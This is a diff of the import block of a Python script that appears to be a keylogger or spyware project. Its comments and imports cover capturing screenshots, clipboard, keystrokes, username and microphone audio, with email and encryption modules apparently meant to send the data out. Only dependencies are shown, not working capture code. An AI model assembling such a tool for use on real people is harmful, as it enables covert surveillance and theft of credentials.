@@ -9,10 +9,14 @@ from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
 # Modules to collect Clipboard
-import win32clipboard
+#import win32clipboard
+#import pyperclip
+import clipboard
+
+
 
 # Modules to collect Key Stroke
-from pynput.keyboard import Key, Listener
+from pynput.keyboard import *
 
 # Modules for email functionality
 from email.mime.multipart import MIMEMultipart
@@ -26,7 +30,7 @@ from cryptography.fernet import Fernet
 
 # Modules to collect time and OS information 
 import time 
-import OS
+import os
 
 # Modules to get username information
 import getpass
@@ -38,4 +42,4 @@ import sounddevice as soundDeviceObject
 
 
 
-print(2)
+print("Dependicies Running Properly.. Yayyy!")
